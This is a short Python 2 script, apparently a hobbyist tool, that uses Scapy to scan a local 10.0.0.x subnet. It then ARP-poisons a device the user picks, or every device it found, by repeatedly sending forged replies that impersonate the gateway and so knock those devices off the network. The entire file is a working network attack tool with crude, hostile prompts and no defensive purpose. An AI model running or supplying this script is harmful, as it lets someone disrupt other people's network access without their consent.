from scapy.all import *
import time

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

def get_ip_macs(ips):
  answers, uans = arping(ips, verbose=0)
  res = []
  for answer in answers:
    mac = answer[1].hwsrc
    ip  = answer[1].psrc
    res.append((ip, mac))
  return res

def poison(victim_ip, victim_mac, gateway_ip):
  packet = ARP(op=2, psrc=gateway_ip, pdst=victim_ip, hwdst=victim_mac)
  send(packet, verbose=0)
  
refreshing = True
while refreshing:
  devices = get_ip_macs('10.0.0.*')
  print "Connected guys:"
  i = 0
  for device in devices:
    print '%s)\t%s\t%s' % (i, device[0], device[1])
    i+=1
  
  print "Who do you want to fuck?"
  print "(r - Refresh, a - Kill all)"

  input_is_valid = False
  killall = False
  while not input_is_valid:
    choice = raw_input(">")
    if choice.isdigit():
      if int(choice) < len(devices) and int(choice) >= 0:
        refreshing = False
        input_is_valid = True
    elif choice is 'a':
      killall = True
      input_is_valid = True
      refreshing = False
    elif choice is 'r':
      input_is_valid = True
    
    if not input_is_valid:
      print 'Please enter a valid choice'

if choice.isdigit():
  choice = int(choice)
  victim = devices[choice]
  print "Fucking %s..." % victim[0]
  try:
    while True:
      poison(victim[0], victim[1], '10.0.0.1')
  except KeyboardInterrupt:
      print 'You\'re welcome!'
elif killall:
  try:
    while True:
      for victim in devices:
        poison(victim[0], victim[1], '10.0.0.1')
  except KeyboardInterrupt:
    print 'You\'re welcome!'
    
